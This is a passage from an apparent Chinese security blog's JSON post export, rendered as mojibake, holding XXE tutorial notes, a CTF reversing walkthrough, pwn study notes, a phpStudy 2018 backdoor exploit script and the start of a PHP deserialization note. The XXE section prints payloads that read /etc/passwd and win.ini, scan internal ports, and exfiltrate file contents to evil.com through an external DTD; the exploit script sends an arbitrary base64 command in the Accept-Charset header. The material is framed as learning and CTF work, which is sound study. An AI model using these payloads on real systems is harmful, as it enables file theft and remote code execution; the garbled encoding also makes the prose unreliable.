ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; ]]]&gt; &lt;!--æ–‡æ¡£å…ƒç´ --&gt; &lt;note&gt; &lt;to&gt;Dave&lt;/to&gt; &lt;from&gt;Tom&lt;/from&gt; &lt;head&gt;Reminder&lt;/head&gt; &lt;body&gt;You are a good man&lt;/body&gt; &lt;/note&gt; ä¸Šè¿°XMLä»£ç åŸºæœ¬åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š ç¬¬ä¸€éƒ¨åˆ†æ˜¯XMLçš„å£°æ˜ï¼› ç¬¬äºŒéƒ¨åˆ†æ˜¯XMLçš„DTDæ–‡æ¡£ç±»å‹å®šä¹‰ ç¬¬ä¸‰éƒ¨åˆ†æ˜¯XMLè¯­å¥ è€Œå¤–éƒ¨å®ä½“æ”»å‡»ä¸»è¦åˆ©ç”¨DTDçš„å¤–éƒ¨å®ä½“æ¥è¿›è¡Œæ³¨å…¥çš„ã€‚ DTDæœ‰ä¸¤ç§æ„å»ºæ–¹å¼ï¼Œåˆ†åˆ«ä¸ºå†…éƒ¨DTDå£°æ˜å’Œå¤–éƒ¨DTDå£°æ˜ â€‹ tips: DTD = Document Type Definition ç®€ç§° å†…éƒ¨DTDå£°æ˜ï¼š &lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt; å®ä¾‹ï¼šå¦‚ä¸Šè¿°ä»£ç  å¤–éƒ¨DTDå£°æ˜ï¼š &lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt; å®ä¾‹ï¼š &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt; &lt;note&gt; &lt;to&gt;Y&lt;/to&gt; &lt;from&gt;K&lt;/from&gt; &lt;head&gt;J&lt;/head&gt; &lt;body&gt;ESHLkangi&lt;/body&gt; &lt;/note&gt; 0x02 XMLç®€å•ç”¨æ³• &lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; å¤–éƒ¨å®ä½“: &lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; å‚æ•°å®ä½“: &lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; æˆ–è€… &lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; å®åˆ—æ¼”ç¤º: é™¤å‚æ•°å®ä½“å¤–å®ä½“+å†…éƒ¨å®ä½“ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a[ &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt; &lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt; å®åˆ—æ¼”ç¤º: å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a[ &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt; %name; ]&gt; æ³¨æ„ï¼š%nameï¼ˆå‚æ•°å®ä½“ï¼‰æ˜¯åœ¨DTDä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&amp;nameï¼ˆå…¶ä½™å®ä½“ï¼‰æ˜¯åœ¨xmlæ–‡æ¡£ä¸­è¢«å¼•ç”¨çš„ã€‚ ç”±äºxxeæ¼æ´ä¸»è¦æ˜¯åˆ©ç”¨äº†DTDå¼•ç”¨å¤–éƒ¨å®ä½“å¯¼è‡´çš„æ¼æ´ï¼Œé‚£ä¹ˆé‡ç‚¹çœ‹ä¸‹èƒ½å¼•ç”¨å“ªäº›ç±»å‹çš„å¤–éƒ¨å®ä½“ã€‚ å¤–éƒ¨å®ä½“ å¤–éƒ¨å®ä½“å³åœ¨DTDä¸­ä½¿ç”¨ &lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; å®ä¾‹æ¼”ç¤ºï¼š &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a[ //å®šä¹‰ä¸€ä¸ªå¤–éƒ¨åç§° &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; //SYSTEM &quot;file:///xxxx&quot; ç”¨äºè¯»å–æ–‡ä»¶ &lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt; å¾—å¸¦Content-Type: application/xmlå¤´ï¼Œ å¦‚æœè¯·æ±‚å¤´ç±»ä¼¼äºï¼šContent-Type: application/jsonï¼Œ é‚£ä¹ˆå¯ä»¥æ”¹ä¸ºContent-Type: application/xmlè¯•è¯•æœ‰æ²¡æœ‰xmlæ¼æ´ 0x03 XXEæ¼æ´å®æˆ˜ é¢˜ç›®åœ°å€ï¼šweb.jarvisoj.com:9882 æˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹ ç°åœ¨æˆ‘ä»¬å°è¯•æŠŠ Content-Type: application/json æ”¹æˆ application/xml å‘é€ä»¥ä¸‹å†…å®¹æ¢æµ‹æ˜¯å¦å­˜åœ¨XXE &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE TEST [ &lt;!ENTITY xxe &quot;XXE TEST&quot;&gt; //XXE Testæ˜¯è¾“å‡ºçš„å†…å®¹ xxeå¯ä»¥ä¸ºç†è§£ä¸ºä¸€ä¸ªå˜é‡ ]&gt; &lt;foo&gt; //ä¹±å–ä¸ªåå°±å¥½ &amp;xxe; //ç†è§£ä¸ºå¼•ç”¨å˜é‡åœ°å€è¾“å‡º &lt;/foo&gt; è¯»å–æ–‡ä»¶æµ‹è¯• è¯»å–flagæµ‹è¯• 0x03.1 ä¸‹é¢åˆ—å‡ºå…¶ä»–çš„ç”¨æ³• XMLæ–‡æ¡£æ˜¯ç”¨PHPè¿›è¡Œè§£æçš„ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨php:*//filteråè®®æ¥è¿›è¡Œè¯»å–ã€‚ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY content SYSTEM &quot;php://filter/resource=c:/windows/win.ini&quot;&gt; ]&gt; &lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt; ç«¯å£æ‰«æ åŠ è½½å¤–éƒ¨DTDæ—¶æœ‰ä¸¤ç§åŠ è½½æ–¹å¼ï¼Œä¸€ç§ä¸ºç§æœ‰privateï¼Œç¬¬äºŒç§ä¸ºå…¬å…±publicã€‚ ç§æœ‰ç±»å‹DTDåŠ è½½ï¼š &lt;!ENTITY private_dtd SYSTEM &quot;DTD_location&quot;&gt; å…¬å…±ç±»å‹DTDåŠ è½½ï¼š &lt;!ENTITY public_dtd PUBLIC &quot;DTD_name&quot; &quot;DTD_location&quot;&gt; åœ¨å…¬å…±ç±»å‹DTDåŠ è½½çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šä½¿ç”¨DTD_nameæ¥æ£€ç´¢ï¼Œå¦‚æœæ— æ³•æ‰¾åˆ°ï¼Œåˆ™é€šè¿‡DTD_locationæ¥å¯»æ‰¾æ­¤å…¬å…±DTDã€‚åˆ©ç”¨DTD_locationï¼Œåœ¨ä¸€å®šçš„ç¯å¢ƒä¸‹å¯ä»¥ç”¨æ¥åšå†…ç½‘æ¢æµ‹ã€‚ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY portscan SYSTEM &quot;http://localhost:3389&quot;&gt; ]&gt; &lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;/foo&gt;&lt;/root&gt; blind xxeæ¼æ´: å¯¹äºä¼ ç»Ÿçš„XXEæ¥è¯´ï¼Œè¦æ±‚æ”»å‡»è€…åªæœ‰åœ¨æœåŠ¡å™¨æœ‰å›æ˜¾æˆ–è€…æŠ¥é”™çš„åŸºç¡€ä¸Šæ‰èƒ½ä½¿ç”¨XXEæ¼æ´æ¥è¯»å–æœåŠ¡å™¨ç«¯æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å›æ˜¾åˆ™å¯ä»¥ä½¿ç”¨Blind XXEæ¼æ´æ¥æ„å»ºä¸€æ¡å¸¦å¤–ä¿¡é“æå–æ•°æ®ã€‚ åˆ©ç”¨DTDè¿›è¡Œæ•°æ®å›æ˜¾ æœ‰æ—¶è¯»å–æ–‡ä»¶æ—¶æ²¡æœ‰å›æ˜¾ï¼Œè¿™æ—¶å¯ä»¥åˆ©ç”¨DTDå‚æ•°å®ä½“çš„ç‰¹æ€§å°†æ–‡ä»¶å†…å®¹æ‹¼æ¥åˆ°urlä¸­ï¼Œè¾¾åˆ°è¯»å–æ–‡ä»¶çš„æ•ˆæœã€‚ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root[ &lt;!ENTITY % file SYSTEM &quot;php://fileter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt; %dtd; %send;]&gt; &lt;root&gt;&lt;/root&gt; evil.dtd &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;&quot;&gt; %payload; åœ¨evil.dtdä¸­å°†%fileå®ä½“çš„å†…å®¹æ‹¼æ¥åˆ°urlåï¼Œç„¶ååˆ©ç”¨burpç­‰å·¥å…·ï¼ŒæŸ¥çœ‹urlè¯·æ±‚å°±èƒ½è·å¾—æˆ‘ä»¬éœ€è¦çš„å†…å®¹ 0x04 å‚è€ƒé“¾æ¥ æˆ‘ä¸ªäººè®¤ä¸ºè®²çš„æœ€å¥½çš„é“¾æ¥ï¼š http://xz.aliyun.com/t/6887 https://www.freebuf.com/articles/web/177979.html https://www.cnblogs.com/vincebye/p/7199290.html https://www.jianshu.com/p/ec2888780308 https://www.cnblogs.com/ESHLkangi/p/9245404.html è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"BugkuCTFé€†å‘","slug":"BugkuCTFé€†å‘","date":"2019-11-06T14:59:26.000Z","updated":"2020-07-10T05:31:07.383Z","comments":true,"path":"2019/11/06/BugkuCTFé€†å‘/","link":"","permalink":"https://hu5k7.github.io/2019/11/06/BugkuCTFé€†å‘/","excerpt":"0x00 å¼€è¨€ æœ€è¿‘äº†è§£äº†ç‚¹é€†å‘ï¼Œpwnï¼Œæ±‡ç¼–ï¼ŒCï¼ŒC#ç­‰çŸ¥è¯†ï¼Œå¼€å§‹è¯•ç€åˆ·é¢˜å®æˆ˜ä¸€ä¸‹ã€‚","text":"0x00 å¼€è¨€ æœ€è¿‘äº†è§£äº†ç‚¹é€†å‘ï¼Œpwnï¼Œæ±‡ç¼–ï¼ŒCï¼ŒC#ç­‰çŸ¥è¯†ï¼Œå¼€å§‹è¯•ç€åˆ·é¢˜å®æˆ˜ä¸€ä¸‹ã€‚ 0x00.1 ç¯å¢ƒ&amp;å·¥å…· å·¥å…·ï¼š IDA &amp; OD ç¯å¢ƒï¼šWindows7 0x00.2 éœ€è¦æ³¨æ„çš„äº‹é¡¹ tips: åœ¨windowsä¸‹é€†å‘éœ€è¦æ³¨æ„ï¼Œä»windowsXPä»¥ä¸Šéƒ½æœ‰å¼€å¯aslrä¿æŠ¤ï¼Œ â€‹ ASLRï¼ˆAddress space layout randomizationï¼‰æ˜¯ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å¯¹å †ã€æ ˆã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–ï¼Œé€šè¿‡å¢åŠ æ”»å‡»è€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®ï¼Œè¾¾åˆ°é˜»æ­¢æº¢å‡ºæ”»å‡»çš„ç›®çš„ã€‚ 0x01 å…¥é—¨é€†å‘ ä½¿ç”¨idaæ‰“å¼€å‘ç°æ²¡æœ‰ä»»ä½•å€¼å¾—ï¼ŒæŸ¥çœ‹çš„ã€‚ç›´æ¥ æŒ‰F5æŸ¥çœ‹ä¼ªä»£ç  å†æŒ‰Rè½¬ç  å°±å®Œäº‹äº†. 0x02 Easy_vb idaæ‰“å¼€ ç›´æ¥å¾€ä¸‹çœ‹ã€‚çœ‹åˆ°flag 0x03 Easy_re è¿™æ¬¡ä½¿ç”¨ odå·¥å…· ã€‚ç›´æ¥ä¸Šåªèƒ½æœç´¢çœ‹çœ‹ã€‚ 0x04 æ¸¸æˆè¿‡å…³ è¿™ä¸€é¢˜æ¯”è¾ƒéš¾ã€‚ éœ€è¦ç”¨åˆ°çš„å·¥å…·: ida &amp; od 0x04.1 ç¬¬ä¸€æ­¥ IDA æˆ‘ä»¬å…ˆç”¨ ida å’Œ od æ‰“å¼€ ç¨‹åº æˆ‘ä»¬å…ˆçœ‹idaè¿™è¾¹ï¼Œå…ˆçœ‹shift+f12çœ‹çœ‹å­—ç¬¦ä¸² å‘ç°å­—ç¬¦ä¸²çª—å£æœ‰ä¸ª done!!!the flag is è¿™é‡Œæ˜¯æœ€åå¾—å‡ºflagçš„åœ°æ–¹ï¼Œæˆ‘ä»¬å…ˆä¸çœ‹ä»–ï¼Œå¾€ä¸‹ç¿» è¿™æ¬¡æˆ‘ä»¬çœ‹åˆ° Play a game\\n è¿™é‡Œæ˜¯ç¨‹åºçš„ å¼€å¤´è¨€çš„åœ°æ–¹ã€‚æˆ‘ä»¬åŒå‡»è·³è¿‡å»çœ‹çœ‹ã€‚ è¿™é‡Œæœ‰è°ƒç”¨aPlayAGameTheNIå‡½æ•°ã€‚æˆ‘ä»¬æŒ‰xè·³åˆ°ï¼Œè°ƒç”¨ä»–çš„åœ°æ–¹ã€‚ ä»–è·³åˆ°äº†æœ€ä¸Šé¢çš„çª—å£ã€‚æˆ‘ä»¬å¾€ä¸‹ç¿» çœ‹åˆ° input n,n è¿™é‡Œ æ˜¯è®©ç”¨æˆ·è¾“å…¥(1-8)çš„åœ°æ–¹ã€‚æˆ‘ä»¬æŒ‰F5çœ‹çœ‹ä¼ªä»£ç  åˆ†æä¸€ä¸‹ä¼ªä»£ç ã€‚ æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œæ˜¯ç»™ç”¨æˆ·å¾ªç¯è¾“å…¥çš„åœ°æ–¹ æœ‰ä¸ªæ–­ç‚¹sub_459418();ã€‚å°±æ˜¯æˆ‘ä»¬è¦è·³è½¬çš„åœ°æ–¹. æˆ‘ä»¬ç°åœ¨å›åˆ°ä¹‹å‰çœ‹åˆ° done!!! the flag is åœ°æ–¹ è·³è½¬è¿‡å»çœ‹ä¸€çœ‹ã€‚ çœ‹åˆ°æœ‰ä¸€ä¸ªå‡½æ•°ä¸º aDoneTheFlagIs, æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªé€‰é¡¹ï¼Œèƒ½ç›´æ¥æŸ¥çœ‹åˆ°è¿™ä¸ªçš„ åŸºå€ æˆ‘ä»¬å¾€ä¸Šç¿»ï¼Œæ‰¾åˆ°è¿™ä¸ªçš„Topä½ç½® è¿™é‡Œã€‚0045E940æˆ‘ä»¬è®°ä¸‹æ¥è¿™ä¸ªåŸºå€ å†æŠŠ sub_459418();è¿™é‡Œçš„åŸºå€è®°ä¸‹æ¥ã€‚ 0x04.2 ç¬¬äºŒæ­¥ OD ç°åœ¨æˆ‘ä»¬å›åˆ° od å…ˆè¿™ä¸ªç¨‹åºè¿è¡Œèµ·æ¥ã€‚ç‚¹æ’­æ”¾é”®(å·¦ä¸Šè§’) ç„¶åæˆ‘ä»¬ç‚¹Ctrl+G æ¥è·³è½¬åœ°å€åˆ°0045E940åœ°æ–¹ã€‚ æŒ‰F2è®¾ç½®æ–­ç‚¹ã€‚ç„¶ååˆ°ç¨‹åºé‡Œéšä¾¿è¾“å…¥ä¸ªæ•°å­—(1-8),å‘ç°è¯¥ç¨‹åºè¿è¡Œåˆ°äº† 0045f515åœ°å€è¿™é‡Œåœä½äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç”¨0045e940è¿™ä¸ªåœ°å€ åŒå‡»0045f515åœ°å€ï¼Œå†™ä¸Šjmp 0045e940(jmpä¸ºæ±‡ç¼–ç ï¼Œæ„æ€è·³è½¬) æ›´æ–°ç¨‹åºè¿è¡Œã€‚ç‚¹åˆ°è¯¥ç¨‹åºçš„å¾ªç¯ä½ç½®ï¼Œä¸ºæ­¢ã€‚(0045EB51) ç™½æ¡†çš„ä½ç½®ä¾¿æ˜¯ ï½—ï½ˆï½‰ï½Œï½…å¾ªç¯çš„åœ°æ–¹ æˆ‘ä»¬åœ¨0045EBC1åœ°å€è®¾ç½®æ–­ç‚¹ ä½¿è¿™ä¸ªç¨‹åºç›´æ¥è·³è¿‡ï½—ï½ˆï½‰ï½Œï½…å¾ªç¯ è®¾ç½®æ–­ç‚¹å ç‚¹ç»§ç»­è¿è¡Œç¨‹åº æ‹¿åˆ°flag! è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hu5k7.github.io/categories/CTF/"},{"name":"CTF-Reverse-Note","slug":"CTF/CTF-Reverse-Note","permalink":"https://hu5k7.github.io/categories/CTF/CTF-Reverse-Note/"}],"tags":[{"name":"CTF-Reverse-Note","slug":"CTF-Reverse-Note","permalink":"https://hu5k7.github.io/tags/CTF-Reverse-Note/"}]},{"title":"ã€Pwnã€‘å­¦ä¹ ç¬”è®°ç¬¬é›¶æœŸ:å¼€ç«¯","slug":"pwnå­¦ä¹ ç¬”è®°-00","date":"2019-11-01T00:00:00.000Z","updated":"2020-07-10T05:31:57.592Z","comments":true,"path":"2019/11/01/pwnå­¦ä¹ ç¬”è®°-00/","link":"","permalink":"https://hu5k7.github.io/2019/11/01/pwnå­¦ä¹ ç¬”è®°-00/","excerpt":"0x00 èµ·å›  æœ‰ä¸€æ¬¡å·²ç»ä¸Šäº†æ·±èŒé™¢çš„å­¦é•¿å‘Šè¯‰æˆ‘ï¼Œæ·±èŒé™¢é‚£è¾¹éå¸¸ç¼ºpwné€‰æ‰‹ã€‚æˆ‘ä¸€ç›´æŒºå¤´ç–¼pwné¢˜çš„ï¼Œè€—çœ¼åŠ›ã€‚å…¥é—¨éš¾ã€‚ è€Œä¸”è¿™æ–¹é¢çš„èµ„æ–™ä¹Ÿç›¸å¯¹è¾ƒå°‘ï¼Œæ‰€ä»¥å­¦ä¹ pwnçš„äººä¹Ÿæ˜¯ç›¸å¯¹è¾ƒå°‘çš„ã€‚ ä¸è¿‡ä¸ºäº†å¤šç´¯è®¡ä¸€äº›çŸ¥è¯†ï¼Œç¡¬ç€å¤´çš®å°è¯•çš„å¾€ä¸Šé¡¶ã€‚å†²å†²å†²ï¼ï¼ï¼","text":"0x00 èµ·å›  æœ‰ä¸€æ¬¡å·²ç»ä¸Šäº†æ·±èŒé™¢çš„å­¦é•¿å‘Šè¯‰æˆ‘ï¼Œæ·±èŒé™¢é‚£è¾¹éå¸¸ç¼ºpwné€‰æ‰‹ã€‚æˆ‘ä¸€ç›´æŒºå¤´ç–¼pwné¢˜çš„ï¼Œè€—çœ¼åŠ›ã€‚å…¥é—¨éš¾ã€‚ è€Œä¸”è¿™æ–¹é¢çš„èµ„æ–™ä¹Ÿç›¸å¯¹è¾ƒå°‘ï¼Œæ‰€ä»¥å­¦ä¹ pwnçš„äººä¹Ÿæ˜¯ç›¸å¯¹è¾ƒå°‘çš„ã€‚ ä¸è¿‡ä¸ºäº†å¤šç´¯è®¡ä¸€äº›çŸ¥è¯†ï¼Œç¡¬ç€å¤´çš®å°è¯•çš„å¾€ä¸Šé¡¶ã€‚å†²å†²å†²ï¼ï¼ï¼ 0x01 éœ€è¦å…·å¤‡çš„çŸ¥è¯† 1.æ‰å®çš„CåŸºç¡€ 2.åŸºæœ¬DSï¼šé“¾è¡¨ã€é˜Ÿåˆ—ã€æ ˆ 3.åŸºæœ¬linuxé…ç½®ä¸å‘½ä»¤ 4.ä¼šæ±‡ç¼–æ›´å¥½ï¼Œä¸ä¼šçš„è¯ç°å­¦å‡ ä¸ªå¸¸ç”¨çš„ä¹Ÿå¯ä»¥æ•‘æ€¥ã€‚ 0x02 ç¯å¢ƒæ­å»º ä½¿ç”¨çš„ç³»ç»Ÿ: ubuntu19 å·¥å…·: python - pwntools â€‹ pwndbg â€‹ ida â€‹ gcc-multilib è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hu5k7.github.io/categories/CTF/"},{"name":"CTF-Pwn-Note","slug":"CTF/CTF-Pwn-Note","permalink":"https://hu5k7.github.io/categories/CTF/CTF-Pwn-Note/"}],"tags":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/tags/CTF-Pwn-Note/"}]},{"title":"ã€Pwnã€‘å­¦ä¹ ç¬”è®°ç¬¬ä¸€æœŸ:æ ˆçŸ¥è¯†","slug":"pwnå­¦ä¹ ç¬”è®°-01","date":"2019-11-01T00:00:00.000Z","updated":"2020-07-10T05:33:53.081Z","comments":true,"path":"2019/11/01/pwnå­¦ä¹ ç¬”è®°-01/","link":"","permalink":"https://hu5k7.github.io/2019/11/01/pwnå­¦ä¹ ç¬”è®°-01/","excerpt":"0x00 éœ€è¦å…·å¤‡çš„çŸ¥è¯†","text":"0x00 éœ€è¦å…·å¤‡çš„çŸ¥è¯† ç¼–è¯‘ç¨‹åºçš„å†…å­˜åˆ†é… æ ˆåŒº (stack) å‡½æ•°è¿è¡Œæ—¶åˆ†é…ï¼Œå‡½æ•°ç»“æŸæ—¶é‡Šæ”¾ã€‚ç”±ç¼–è¯‘å™¨è‡ªåŠ¨åˆ†é…é‡Šæ”¾ ï¼Œå­˜æ”¾ä¸ºè¿è¡Œå‡½æ•°è€Œåˆ†é…çš„å±€éƒ¨å˜é‡ã€å‡½æ•°å‚æ•°ã€è¿”å›æ•°æ®ã€è¿”å›åœ°å€ç­‰ã€‚å…¶æ“ä½œæ–¹å¼ç±»ä¼¼äºæ•°æ®ç»“æ„ä¸­çš„æ ˆã€‚ å †åŒº (heap) ä¸€èˆ¬ç”±ç¨‹åºå‘˜åˆ†é…é‡Šæ”¾ï¼Œ è‹¥ç¨‹åºå‘˜ä¸é‡Šæ”¾ï¼Œç¨‹åºç»“æŸæ—¶å¯èƒ½ç”±OSï¼ˆæ“ä½œç³»ç»Ÿï¼‰å›æ”¶ã€‚åˆ†é…æ–¹å¼ç±»ä¼¼äºé“¾è¡¨ã€‚ å…¨å±€åŒº(é™æ€åŒºstatic) å­˜æ”¾å…¨å±€å˜é‡ã€é™æ€æ•°æ®ã€å¸¸é‡ã€‚ç¨‹åºç»“æŸåç”±ç³»ç»Ÿé‡Šæ”¾ã€‚å…¨å±€åŒºåˆ†ä¸ºå·²åˆå§‹åŒ–å…¨å±€åŒºï¼ˆdataï¼‰å’Œæœªåˆå§‹åŒ–å…¨å±€åŒºï¼ˆbssï¼‰ã€‚ å¸¸é‡åŒº(æ–‡å­—å¸¸é‡åŒº) å­˜æ”¾å¸¸é‡å­—ç¬¦ä¸²ï¼Œç¨‹åºç»“æŸåæœ‰ç³»ç»Ÿé‡Šæ”¾ã€‚ ä»£ç åŒº å­˜æ”¾å‡½æ•°ä½“ï¼ˆç±»æˆå‘˜å‡½æ•°å’Œå…¨å±€åŒºï¼‰çš„äºŒè¿›åˆ¶ä»£ç ã€‚ 0x01 å †æ ˆ(stack)çŸ¥è¯† è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hu5k7.github.io/categories/CTF/"},{"name":"CTF-Pwn-Note","slug":"CTF/CTF-Pwn-Note","permalink":"https://hu5k7.github.io/categories/CTF/CTF-Pwn-Note/"}],"tags":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/tags/CTF-Pwn-Note/"}]},{"title":"phpstudy2018_backdoor_exp","slug":"phpstudy2018-backdoor-exp","date":"2019-10-17T13:50:35.000Z","updated":"2020-07-10T05:31:55.400Z","comments":true,"path":"2019/10/17/phpstudy2018-backdoor-exp/","link":"","permalink":"https://hu5k7.github.io/2019/10/17/phpstudy2018-backdoor-exp/","excerpt":"0x00 èµ·å›  å‰å‡ ä¸ªæ˜ŸæœŸçœ‹åˆ°phpstudyå¸¦æœ‰åé—¨ç¨‹åºã€‚æ‹–åˆ°ç°åœ¨æ‰å¤ç°,çœ‹åˆ°å¯åˆ©ç”¨ä¾¿ç«‹å³å†™ä¸‹åˆ©ç”¨è„šæœ¬","text":"0x00 èµ·å›  å‰å‡ ä¸ªæ˜ŸæœŸçœ‹åˆ°phpstudyå¸¦æœ‰åé—¨ç¨‹åºã€‚æ‹–åˆ°ç°åœ¨æ‰å¤ç°,çœ‹åˆ°å¯åˆ©ç”¨ä¾¿ç«‹å³å†™ä¸‹åˆ©ç”¨è„šæœ¬ 0x01 exp # -*-coding:utf-8 -*- import base64 import requests def Expoit(ip,exp): payload = exp pay = base64.b64encode(payload.encode('utf-8')) headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;, &quot;Accept-Charset&quot;: pay, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, } print(headers) url = ip r = requests.get(url,headers=headers) Expoit(input(&quot;target url&gt;&quot;),input(&quot;payload&gt;&quot;)) è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"phpååºåˆ—åŒ–æ¼æ´å­¦ä¹ ","slug":"PHPååºåˆ—åŒ–å­¦ä¹ ","date":"2019-10-05T00:00:00.000Z","updated":"2020-07-10T05:31:51.760Z","comments":true,"path":"2019/10/05/PHPååºåˆ—åŒ–å­¦ä¹ /","link":"","permalink":"https://hu5k7.github.io/2019/10/05/PHPååºåˆ—åŒ–å­¦ä¹ /","excerpt":"0x00 å†™åœ¨å‰é¢ PHPååºåˆ—åŒ–æ¼æ´è™½ç„¶åˆ©ç”¨çš„æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥åˆ©ç”¨ä¸€èˆ¬éƒ½ä¼šäº§ç”Ÿå¾ˆä¸¥é‡çš„åæœã€‚åœ¨æ˜¥æ‹›çš„æ—¶å€™å¾ˆå¤šå…¬å¸éƒ½é—®è¿‡è¿™ä¸ªé—®é¢˜ï¼Œè¯´æ˜è¿™ä¸ªååºåˆ—åŒ–æ¼æ´çš„æŠ€èƒ½ç‚¹ä¹Ÿæ˜¯å¾ˆå¤šå…¬å¸æ¯”è¾ƒå…³æ³¨çš„æŠ€èƒ½ç‚¹ã€‚","text":"0x00 å†™åœ¨å‰é¢ PHPååºåˆ—åŒ–æ¼æ´è™½ç„¶åˆ©ç”¨çš„æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥åˆ©ç”¨ä¸€èˆ¬éƒ½ä¼šäº§ç”Ÿå¾ˆä¸¥é‡çš„åæœã€‚åœ¨æ˜¥æ‹›çš„æ—¶å€™å¾ˆå¤šå…¬å¸éƒ½é—®è¿‡è¿™ä¸ªé—®é¢˜ï¼Œè¯´æ˜è¿™ä¸ªååºåˆ—åŒ–æ¼æ´çš„æŠ€èƒ½ç‚¹ä¹Ÿæ˜¯å¾ˆå¤šå…¬å¸æ¯”è¾ƒå…³æ³¨çš„æŠ€èƒ½ç‚¹ã€‚ 0x01 PHPååºåˆ—åŒ–æ¼æ´ PHPååºåˆ—åŒ–æ¼æ´,ä¸€ç›´å›´ç»•ç€ä¸¤ä¸ªå‡½æ•°serialize() å’Œunserialize() serialize() //æ˜¯ç”¨äºå°†ç±»è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² unserialize() //ç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢å›ä¸€ä¸ªç±» serialize() &lt;?php class fangxuliehua{ public $var1=&quot;test for fangxuliehua&quot;; } $fangxuliehua = new fangxuliehua();//æ ¹æ®fangxuliehuaç±»å®åˆ—åŒ–å¯¹è±¡ $fangxueliehua_ser = serialize($fangxuliehua); print_r($fangxueliehua_ser); ?&gt; æˆ‘ä»¬è¿™è¾¹åˆ›å»ºäº†æ–°çš„å¯¹è±¡ï¼Œå¹¶å°†ä»–åºåˆ—åŒ–æ‰“å°å‡ºæ¥ã€‚ç»“æœä¸ºï¼š O:12:&quot;fangxuliehua&quot;:1:{s:4:&quot;var1&quot;;s:4:&quot;test&quot;;} 